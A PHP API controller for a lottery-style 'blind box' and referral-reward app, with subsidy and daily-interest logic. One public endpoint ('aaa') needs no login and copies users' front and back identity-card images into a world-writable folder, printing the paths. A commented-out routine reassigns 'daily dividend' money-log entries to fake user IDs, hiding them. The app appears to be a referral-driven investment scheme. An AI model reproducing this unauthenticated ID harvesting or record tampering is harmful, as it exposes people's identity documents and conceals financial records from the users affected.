<?php

namespace app\api\controller;

use app\common\controller\Api;
use think\Db;
use app\api\model\UserMoney;

/**
 * 示例接口
 */
class Blindbox extends Api
{
    // 无需登录的接口,*表示全部
    protected $noNeedLogin = ['aaa'];
    // 无需鉴权的接口,*表示全部
    protected $noNeedRight = ['*'];
    public function aaa(){
        $targetDir = 'new_folder/';
        // 创建目标目录（如不存在）
        if (!is_dir($targetDir)) {
            mkdir($targetDir, 0777, true);
        }
        
        // 查询 card_image 和 cardbm_image 不为空的记录
        $images = Db::name('user')
    ->where('card_image', '<>', '')
    ->where('card_image', 'not null')
    ->where('cardbm_image', '<>', '')
    ->where('cardbm_image', 'not null')
    ->where('is_rot', 'eq',1)
            ->select();
        foreach ($images as $key=>$img) {
            $fields = ['card_image', 'cardbm_image'];
            foreach ($fields as $field) {
                $originalPath = $img[$field];
                // 去掉域名（http:// 或 https:// 后的域名）
                $cleanPath = preg_replace('#^https?://[^/]+/#', '', ltrim($originalPath, '/'));
                
                // 构建源路径（如果实际路径带 public/ 可加上）
                $sourcePath = $cleanPath;
                $targetDira=$targetDir.$key.'/';
                if (!is_dir($targetDira)) {
                    mkdir($targetDira, 0777, true);
                }
                // 目标文件名保留原名，存入目标目录
                $destinationPath = $targetDira . basename($cleanPath);
                // 检查文件是否存在并复制
                if (file_exists($sourcePath)) {
                    if (copy($sourcePath, $destinationPath)) {
                        echo "✅ 已复制：$sourcePath -> $destinationPath\n";
                    } else {
                        echo "❌ 复制失败：$sourcePath\n";
                    }
                } else {
                    echo "⚠️ 文件不存在：$sourcePath\n";
                }
            }
        }

    //     $a=[2097207,2097002,2096797,2096592,2096387,2096182,2095977,2095772,2095567,2095362,2095157];
    //     foreach ($a as $k=>$id){
    //         $user_id=Db::name('project_task2')->where(['id'=>$id])->value('user_id');
    //         $ordercount=Db::name('order')->where(['user_id'=>$user_id])->count();//每日分红
    //         $user_money_log=Db::name('user_money_log')->where(['user_id'=>$user_id,'memo'=>'每日分红','createtime'=>['between',[1752508800,1752595200]]])->select();//每日分红
    //         $count=count($user_money_log);
    //         $c=bcsub($count,$ordercount);
    //         if ($c>0){
    //             for ($i = 1; $i <= $c; $i++) {
    //                 // var_dump($user_money_log[$count-$i]['id']);
    //                  Db::name('user_money_log')->where(['user_id'=>$user_id,'id'=>$user_money_log[$count-$i]['id']])->update(['user_id'=>bcadd(10000000,$user_id)]);
    //             }
    //         }
    //     }
    }
    private function armyday($user_id=402473,$money=4996,$qty=1,$pid=0){
        $blindbox_time_Interval=config('site.partyfoundingday_time');
        if (!$blindbox_time_Interval) {
            return true;
        }
        // 拆分时间段105188.00
        list($start, $end) = explode(' - ', $blindbox_time_Interval);
        $user=Db::name('user')->where(['id'=>$user_id])->find();
        // 转换为时间戳
        $startTime = strtotime($start);
        $endTime = strtotime($end);
        $now = time(); // 当前时间戳
        // 验证活动时间
        if ($now >= $startTime && $now <= $endTime) {
            $annualization=Config('site.annualization');
            $nxxfjlist=[];
            //今年的最后一天
            $year = date('Y'); // 当前年份
            $nextYearTimestamp = strtotime("$year-12-31 23:59:59");
            $time=time();
            $updatetime=bcadd($time,172800);
            $m=bcmul($money,$qty,2);
            $m10=bcmul($m,10,2); // 只用于补贴金
            if($money>896){
                \app\common\model\User::nxxfj($m10,$user_id,'红色引领促消费，惠民扩需庆华诞内需消费补贴金','nxxfj');
                $dailyInterest=$this->getinterest($year,$m10,$annualization[1]);
                $nxxfjlist[]=[
                    'money'=>$m10,
                    'user_id'=>$user_id,
                    'yeartime'=>1,
                    'year_rate'=>$annualization[1],
                    'expirytime'=>$nextYearTimestamp,
                    'status'=>1,
                    'interest'=>$dailyInterest,
                    'createtime'=>$time,
                    'updatetime'=>$updatetime,
                ];
                if ($nxxfjlist) {
                    Db::name('nxxfjlist')->insertAll($nxxfjlist);
                }
            }
            
            //购买套餐增加经验
            $jingyanData = [
                'user_id' => $user_id,
                'score' => $m,
                'before' => $user['game_level_jy'],
                'after' => $user['game_level_jy'] + $m,
                'memo' => '红色引领促消费庆华诞增加经验',
                'createtime' => $time
            ];
            \app\api\model\UserJingyanLog::create($jingyanData);
            \app\api\model\User::where('id', $user_id)->setInc('game_level_jy', $m);//经验
            $neixu_m=bcdiv($m,2,2);
            $neixu_data = [
                'user_id' => $user_id,
                'money' => $neixu_m,
                'before' => $user['neixuquan'] ?? 0,
                'after' => ($user['neixuquan'] ?? 0) + $neixu_m,
                'memo' => '红色引领促消费庆华诞专属内需券',
                'createtime' => $time,
                'type' => 'neixuquan',
            ];
            
            \app\api\model\User::where('id', $user_id)->setInc('neixuquan',$neixu_m);
            \app\api\model\UserMoneyLog::create($neixu_data);
            
            
        }
    }
    // public function aaa(){
    //     $order=Db::name('order')->where(['id'=>['<',57964],'createtime'=>['>',1749414055],'status'=>1])->select();
    //     // var_dump($order);
    //     foreach ($order as $project_data) {
    //         $task2=Db::name('project_task2')->where(['order_id'=>$project_data['id']])->count();
    //         if ($task2) {
    //             $user = Db::name('user')->where('id', $project_data['user_id'])->find();
    //             if($user['is_buy']!=1&&$project_data['project_data_id']!=8){
    //                 \app\api\model\User::where('id', $project_data['user_id'])->update(['is_buy' => 1,'buy_time'=>time()]);//直推激活
    //                 if (Config('site.is_nxxfj')&&$user['createtime']>1746633600) {
    //                     $time=time();
    //                     $updatetime=bcadd($time,172800);
    //                     $year = date('Y'); // 当前年份
    //                     $nextYearTimestamp = strtotime("$year-12-31 23:59:59");
    //                         $nxxfj=Config('site.new_send_nxxfj');
    //                         $msg='新人注册激活认购套餐';
    //                     if ($nxxfj) {
    //                         \app\common\model\User::nxxfj($nxxfj,$project_data['user_id'],$msg,'nxxfj');
    //                         $annualization=Config('site.annualization');
    //                         $dailyInterest=$this->getinterest($year,$nxxfj,$annualization[1]);
    //                         Db::name('nxxfjlist')->insert([
    //                             'money'=>$new_registerp_nxxfj,
    //                             'user_id'=>$project_data['user_id'],
    //                             'yeartime'=>1,
    //                             'year_rate'=>$annualization[1],
    //                             'expirytime'=>$nextYearTimestamp,
    //                             'status'=>1,
    //                             'interest'=>$dailyInterest,
    //                             'createtime'=>$time,
    //                             'updatetime'=>$updatetime,
    //                         ]);
    //                     }
                        
    //                     $this->duanwu($project_data['user_id'],$this->auth->upid);
    //                 }
    //             }
    //             $ins = [
    //                 'user_id' => $project_data['user_id'],
    //                 'money' => -$project_data['price'],
    //                 'before' => $user['allmoney'] ?? 0,
    //                 'after' =>  $user['allmoney'] ?? 0 + $project_data['price'],
    //                 'memo' => '项目认购 ' . $project_data['id'],
    //                 'createtime' => time(),
    //                 'type' => 'buy',
    //             ];
    //             \app\api\model\UserMoneyLog::create($ins);
                
    //             //团队分佣
    //             Cmd::checkyong($project_data);
    //             /*************  活动时间：11月12日-12月5日  活动结束****************************/
    //             //更新订单数据
    //             \app\api\model\ProjectData::where('id', $project_data['project_data_id'])->setInc('thismoney', $project_data['price']);
    //             //更新订单状态
    //             $data = [
    //                 'status' => 2,
    //                 'payprice' => $project_data['price'],
    //                 'paytime' => time(),
    //             ];
    //             Db::table('fa_order')->where('id', $project_data['id'])->update($data);
    //         }

            
    //     }

    // }
    
    private function duanwu($user_id,$pid){
        $duanwu_time_Interval=config('site.duanwu_time_Interval');
        // 拆分时间段
        list($start, $end) = explode(' - ', $duanwu_time_Interval);
        
        // 转换为时间戳
        $startTime = strtotime($start);
        $endTime = strtotime($end);
        $now = time(); // 当前时间戳
        // 验证活动时间
        if ($now >= $startTime && $now <= $endTime) {
            
            //注册送内需消费金
            $duanwu_add_act=Config('site.duanwu_add_act');
            $annualization=Config('site.annualization');
            $nxxfjlist=[];
            //今年的最后一天
            $year = date('Y'); // 当前年份
            $nextYearTimestamp = strtotime("$year-12-31 23:59:59");
            $time=time();
            $updatetime=bcadd($time,172800);
            if ($duanwu_add_act) {
                \app\common\model\User::nxxfj($duanwu_add_act,$user_id,'粽有乾坤活动激活奖励内需消费补贴金','nxxfj');
                
                $dailyInterest=$this->getinterest($year,$duanwu_add_act,$annualization[1]);
                $nxxfjlist[]=[
                    'money'=>$duanwu_add_act,
                    'user_id'=>$user_id,
                    'yeartime'=>1,
                    'year_rate'=>$annualization[1],
                    'expirytime'=>$nextYearTimestamp,
                    'status'=>1,
                    'interest'=>$dailyInterest,
                    'createtime'=>$time,
                    'updatetime'=>$updatetime,
                ];
            }
            if ($pid) {
                $new_registerp_nxxfj=Config('site.duanwu_add_upid');
                $dailyInterest=$this->getinterest($year,$new_registerp_nxxfj,$annualization[1]);
                $nxxfjlist[]=[
                    'money'=>$new_registerp_nxxfj,
                    'user_id'=>$pid,
                    'yeartime'=>1,
                    'year_rate'=>$annualization[1],
                    'expirytime'=>$nextYearTimestamp,
                    'status'=>1,
                    'interest'=>$dailyInterest,
                    'createtime'=>$time,
                    'updatetime'=>$updatetime,
                ];
                \app\common\model\User::nxxfj($new_registerp_nxxfj,$pid,'粽有乾坤活动推荐奖励内需消费补贴金','nxxfj');
            }
            if ($nxxfjlist) {
                Db::name('nxxfjlist')->insertAll($nxxfjlist);
            }
            
            
            $rcount=Db::name('user')->where(['createtime'=>['>',$startTime],'upid'=>$pid])->count();
            $buycount=Db::name('user')->where(['createtime'=>['>',$startTime],'upid'=>$pid,'is_buy'=>1])->count();
            $memor=0;
            $memob=0;
            $field='';
            if ($rcount>=39&&$buycount>=11) {
                $memor=20;
                $memob=5;
                $field='level7996';
            }elseif ($rcount>=19&&$buycount>=6) {
                $memor=10;
                $memob=3;
                $field='level4996';
            }elseif ($rcount>=9&&$buycount>=3) {
                $memor=6;
                $memob=2;
                $field='level1796';
            }elseif ($rcount>=3&&$buycount>=1) {
                $memor=3;
                $memob=1;
                $field='level896';
            }
            if ($memor>0) {
                $memo='粽有乾坤活动达成邀请'.$memor.'人激活'.$memob.'人';
                $lcount=Db::name('user_lotterylog')->where(['user_id'=>$pid,'memo'=>$memo])->count();
                if (!$lcount) {
                    \app\common\model\User::lottery(1,$pid,$memo,$field);
                }
            }
            
        }
    }
    /**中奖记录接口
     */
    public function blindboxlist()
    {
        if ($this->request->isPost()) {
            $user_id=$this->auth->id;
            $page = $this->request->post('page',1);
            $page = $page<=0?0:--$page;
            $where=['user_id'=>$user_id];
            $data['list']=Db::name('user_blindboxlist')->where($where)->order('id','desc')->limit($page*10,10)->select();
            foreach ($data['list'] as &$value) {
                $value['prize_name']=Db::name('blindboxlist')->where(['id'=>$value['blindboxlist_id']])->value('name');
            }
            $data['total']=Db::name('user_blindboxlist')->where($where)->count();
            
            $this->success('success',$data);
        }
    }
    
    
    /**滚动中奖历史记录
     */
    public function blindboxlists()
    {
        if ($this->request->isPost()) {
            $user_id=$this->auth->id;
            $page = $this->request->post('page',1);
            $page = $page<=0?0:--$page;
            $total=Db::name('user_blindboxlist')->count();
            $page=rand(0,$total-20);
            $data['list']=Db::name('user_blindboxlist')->order('id','desc')->limit($page,20)->select();
            foreach ($data['list'] as &$value) {
                $value['prize_name']=Db::name('blindboxlist')->where(['id'=>$value['blindboxlist_id']])->value('name');
                $value['username']=Db::name('user')->where(['id'=>$value['user_id']])->value('mobile');
                $value['username'] = substr_replace($value['username'],'****',3,4);
            }
            
            $this->success('success',$data);
        }
    }
    /**
     * 抽奖次数
     */
    public function blindboxnum()
    {
        if ($this->request->isPost()) {
            $user_id=$this->auth->id;
            $page = $this->request->post('page',1);
            $page = $page<=0?0:--$page;
            $where=['user_id'=>$user_id];
            $blindbox=Db::name('user_blindbox')->where($where)->find();
            if (!$blindbox) {
                $time=time();
                Db::name('user_blindbox')->insert(['user_id'=>$user_id,'createtime'=>$time,'updatetime'=>$time]);
                $blindbox=Db::name('user_blindbox')->where($where)->find();
            }
            
            $this->success('success',$blindbox);
        }
    }
    
    /**
     * 抽奖接口
     */
    public function blindbox()
    {
        if ($this->request->isPost()) {
            $user_id=$this->auth->id;
            $symbol = "blindbox" . $user_id;
            $submited = pushRedis($symbol);
            if (!$submited) {
                $this->error(__("操作频繁"));
            }
            $blindbox_id = $this->request->post('blindbox_id',1);
            $blindboxlist=Db::name('blindboxlist')->where(['id'=>$blindbox_id])->find();
            if (!$blindboxlist) {
                $this->error('当前盲盒已关闭');
            }

            $num=[0,'level896','level1796','level4996','level7996'];
            $user_blindbox=Db::name('user_blindbox')->where(['user_id'=>$user_id])->find();
            if ($user_blindbox[$num[$blindbox_id]]<=0) {
                $this->error('盲盒次数不够');
            }
            \app\common\model\User::lottery(-1,$user_id,'抽奖',$user_blindbox[$num[$blindbox_id]]);
            $blindboxlistcount=Db::name('blindboxlist')->where(['blindboxtype_id'=>$blindbox_id,'status'=>1])->sum('probability');
            if ($blindboxlistcount<=0) {
                $this->error('盲盒功能异常,请联系客服！');
            }
            $blindboxlist=Db::name('blindboxlist')->where(['blindboxtype_id'=>$blindbox_id,'status'=>1])->select();
            $blindbox=$this->weighted_random($blindboxlist,$blindboxlistcount);
            if (!$blindbox) {
                $this->error('盲盒功能异常,请联系客服！');
            }
            $time=time();
            $data=[
                'user_id'=>$user_id,
                'blindboxlist_id'=>$blindbox['id'],
                'type'=>$blindbox['type'],
                'status'=>bcadd($blindbox['type'],1),
                'updatetime'=>$time,
                'createtime'=>$time,
            ];
            if ($data['type']&&$blindbox['money_fields']) {
                if ($blindbox['money_fields']=='nxxfj') {
                    $annualization=Config('site.annualization');
                    //今年的最后一天
                    $year = date('Y'); // 当前年份
                    $nextYearTimestamp = strtotime("$year-12-31 23:59:59");
                    $updatetime=bcadd($time,172800);
                    if ($blindbox['money']) {
                        $new_registerp_nxxfj=$blindbox['money'];
                        $dailyInterest=$this->getinterest($year,$new_registerp_nxxfj,$annualization[1]);
                        $nxxfjlist[]=[
                            'money'=>$new_registerp_nxxfj,
                            'user_id'=>$user_id,
                            'yeartime'=>1,
                            'year_rate'=>$annualization[1],
                            'expirytime'=>$nextYearTimestamp,
                            'status'=>1,
                            'interest'=>$dailyInterest,
                            'createtime'=>$time,
                            'updatetime'=>$updatetime,
                        ];
                        \app\common\model\User::nxxfj($new_registerp_nxxfj,$user_id,'盲盒','nxxfj');
                        Db::name('nxxfjlist')->insertAll($nxxfjlist);
                    }
                }elseif ($blindbox['money_fields']=='bbxjhb') {
                    UserMoney::money_in($user_id, 'bbxjhb', $blindbox['money'], '盲盒');
                    \app\api\model\User::where('id', $user_id)->setInc('money', $blindbox['money']);
                }elseif ($blindbox['money_fields']=='game_level_jy') {
                    //购买套餐增加经验
                    $jingyanData = [
                        'user_id' => $user_id,
                        'score' => $blindbox['money'],
                        'before' => $this->auth->game_level_jy,
                        'after' =>  bcadd($blindbox['money'],$this->auth->game_level_jy),
                        'memo' => '盲盒增加经验',
                        'createtime' => time()
                    ];
                    \app\api\model\UserJingyanLog::create($jingyanData);
                    \app\api\model\User::where('id', $user_id)->setInc('game_level_jy', $blindbox['money']);//经验
                }else {
                    $neixu_data = [
                        'user_id' => $user_id,
                        'money' => $blindbox['money'],
                        'before' => $this->auth->neixuquan,
                        'after' => $this->auth->neixuquan + $blindbox['money'],
                        'memo' => '盲盒扩内专属内需券',
                        'createtime' => $time,
                        'type' => 'neixuquan',
                    ];
                    \app\api\model\User::where('id', $user_id)->setInc('neixuquan',$blindbox['money']);
                    \app\api\model\UserMoneyLog::create($neixu_data);
                }
            }
            Db::name('user_blindboxlist')->insert($data);
            \app\common\model\User::blindbox(-1,$user_id,'盲盒',$num[$blindbox_id]);
            $this->success('success',$blindbox);
        }
    }
    function weighted_random($weights,$total_weight) {
        $rand = mt_rand(0, $total_weight - 1);
        $counted_weight = 0;
        foreach ($weights as $item => $weight) {
            $counted_weight += $weight['probability'];
            if ($rand < $counted_weight) {
                return $weight;
            }
        }
        return end($weights); // 应该不会执行到这里，除非$weights数组为空
    }
    private function getinterest($year,$principal,$annualRate){
        // 计算总天数
        $isLeap = date('L', strtotime("$year-01-01")); // 判断是否闰年
        $totalDays = $isLeap ? 366 : 365;
        
        // 计算总利息：本金 × 年利率
        $totalInterest = bcmul($principal, $annualRate,2);
        $totalDays=bcmul($totalDays,100);
        // 计算每天利息：总利息 ÷ 天数
        $dailyInterest = bcdiv($totalInterest, $totalDays, 2);
        return $dailyInterest;
    }
    public function getblindboxnum(){
        if ($this->request->isPost()) {
            $user_id=$this->auth->id;
            $symbol = "blindbox" . $user_id;
            $submited = pushRedis($symbol);
            if (!$submited) {
                $this->error(__("操作频繁"));
            }
            // 直接在接口里设置时间，不读取配置文件
            $startTime = strtotime('2025-06-10 00:00:00');
            $endTime = strtotime('2025-12-31 23:59:59');
            
            $now = time(); // 当前时间戳
            // 验证活动时间
            if ($now >= $startTime && $now <= $endTime) {
                $buycount=Db::name('user')->where(['createtime'=>['>',$startTime],'upid'=>$user_id,'is_buy'=>1])->count();
                $memor=0;
                $data=[
                    ['status'=>0,'where'=>100,'num'=>295,'money'=>5888],
                    ['status'=>0,'where'=>80,'num'=>195,'money'=>2888],
                    ['status'=>0,'where'=>50,'num'=>115,'money'=>2188],
                    ['status'=>0,'where'=>30,'num'=>65,'money'=>1288],
                    ['status'=>0,'where'=>20,'num'=>35,'money'=>588],
                    ['status'=>0,'where'=>10,'num'=>15,'money'=>288],
                    ['status'=>0,'where'=>5,'num'=>5,'money'=>188],
                ];
    
                foreach ($data as $k=>&$v){
                    if ($v['num']<=$buycount) {
                        $a=Db::name('user_money_in_log')->where(['user_id'=>$user_id,'type'=>'tuijian','memo'=>'直推激活达到'.$v['where'].'人奖励'])->count();
                        $v['status']=1;
                        if ($a) {
                            $v['status']=2;
                        }
                    }
                }
                $this->success('success',['data'=>$data,'actnum'=>$buycount]);
            }
            $this->success('不在活动时间');
        }
    }
    public function editblindboxnum(){
        if ($this->request->isPost()) {
            $user_id=$this->auth->id;
            $symbol = "editblindboxnum" . $user_id;
            $submited = pushRedis($symbol);
            if (!$submited) {
                $this->error(__("操作频繁"));
            }
            // 直接在接口里设置时间，不读取配置文件
            $startTime = strtotime('2025-06-10 00:00:00');
            $endTime = strtotime('2025-12-31 23:59:59');
            
            $now = time(); // 当前时间戳
            // 验证活动时间
            if ($now >= $startTime && $now <= $endTime) {
                $buycount=Db::name('user')->where(['createtime'=>['>',$startTime],'upid'=>$user_id,'is_buy'=>1])->count();
                $memor=0;
                $data=[
                    ['status'=>0,'where'=>100,'num'=>295,'money'=>5888],
                    ['status'=>0,'where'=>80,'num'=>195,'money'=>2888],
                    ['status'=>0,'where'=>50,'num'=>115,'money'=>2188],
                    ['status'=>0,'where'=>30,'num'=>65,'money'=>1288],
                    ['status'=>0,'where'=>20,'num'=>35,'money'=>588],
                    ['status'=>0,'where'=>10,'num'=>15,'money'=>288],
                    ['status'=>0,'where'=>5,'num'=>5,'money'=>188],
                ];
                $blindboxnum = $this->request->post('blindboxnum',1);
                $aaa=isset($data[$blindboxnum])?$data[$blindboxnum]:'';
                if (!$aaa) {
                    $this->error(__("已经领取过奖励了"));
                }
                $memo='直推激活达到'.$aaa['where'].'人奖励';
                $a=Db::name('user_money_in_log')->where(['user_id'=>$user_id,'type'=>'tuijian','memo'=>$memo])->count();
                if ($a) {
                    $this->error(__("已经领取过奖励了"));
                }
                
                UserMoney::money_in($user_id, 'tuijian', $aaa['money'], $memo);
                \app\common\model\User::money($aaa['money'], $user_id, $memo,'tui');
                $this->success('领取成功');
            }
            $this->success('不在活动时间');
        }
    }
}
